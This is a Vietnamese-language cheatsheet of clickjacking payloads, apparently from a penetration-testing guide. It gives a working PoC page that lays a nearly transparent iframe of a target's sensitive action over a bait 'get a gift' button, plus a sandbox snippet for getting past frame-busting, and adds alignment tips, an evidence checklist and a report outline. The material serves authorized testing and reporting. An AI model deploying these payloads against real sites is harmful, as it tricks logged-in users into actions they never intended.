# Payloads và Cheatsheet

## Lưu ý phạm vi sử dụng

Các snippet dưới đây chỉ phục vụ mục đích kiểm thử hợp pháp, huấn luyện và phòng thủ trong môi trường được ủy quyền.

## 1. Skeleton PoC tối giản

```html
<!doctype html>
<html>
  <body>
    <style>
      iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 1200px;
        height: 800px;
        opacity: 0.01;
        z-index: 2;
      }
      .bait {
        position: absolute;
        top: 320px;
        left: 260px;
        z-index: 1;
      }
    </style>

    <div class="bait">Nhấn để nhận quà</div>
    <iframe src="https://target.example/sensitive-action"></iframe>
  </body>
</html>
```

## 2. Template căn chỉnh khi debug

Gợi ý: tăng `opacity` tạm thời trong giai đoạn căn chỉnh local, sau đó hạ lại ở bản PoC cuối.

```css
iframe {
  opacity: 0.6; /* chỉ dùng khi debug */
  outline: 2px dashed red;
}
```

## 3. Mẫu dùng con trỏ và lớp mồi

```css
.bait {
  cursor: pointer;
  user-select: none;
}
```

## 4. Snippet sandbox để kiểm thử bypass frame-buster (defense testing)

```html
<iframe
  src="https://target.example"
  sandbox="allow-forms allow-scripts">
</iframe>
```

Thử nghiệm có thể cần thay đổi tổ hợp flag theo behavior mục tiêu:

1. `allow-same-origin`
2. `allow-modals`
3. `allow-popups`

## 5. Checklist hiệu chỉnh nhanh

1. Endpoint mục tiêu có thực sự nhúng được không?
2. Control nhạy cảm có nằm đúng tọa độ dự kiến ở viewport test không?
3. Sau khi hạ opacity, hành vi nhấp còn ổn định không?
4. Hành động đã gây ra side effect xác thực được chưa?

## 6. Mẫu ghi nhận bằng chứng

1. Header chứng minh trạng thái policy framing.
2. Ảnh/clip khi căn chỉnh và lúc tái hiện thành công.
3. Log hoặc trạng thái backend chứng minh thay đổi ngoài ý muốn.

## 7. Sai lầm thường gặp

1. Chỉ chứng minh “nhúng được” nhưng chưa chứng minh “khai thác được”.
2. PoC lệ thuộc một viewport quá hẹp, không đại diện thực tế.
3. Bỏ qua precondition quan trọng (nạn nhân phải đăng nhập, phải có role cụ thể).

## 8. Mẫu khung báo cáo ngắn

1. Tên endpoint và mức nhạy cảm.
2. Điều kiện tiên quyết.
3. Mô tả PoC và chuỗi tương tác.
4. Tác động kinh doanh.
5. Khuyến nghị giảm thiểu.

## Tệp liên quan

- [Khai thác cơ bản](05-basic-exploitation.md)
- [Workflow khai thác](11-exploitation-workflows.md)
- [Phòng thủ và giảm thiểu](13-defense-mitigation.md)
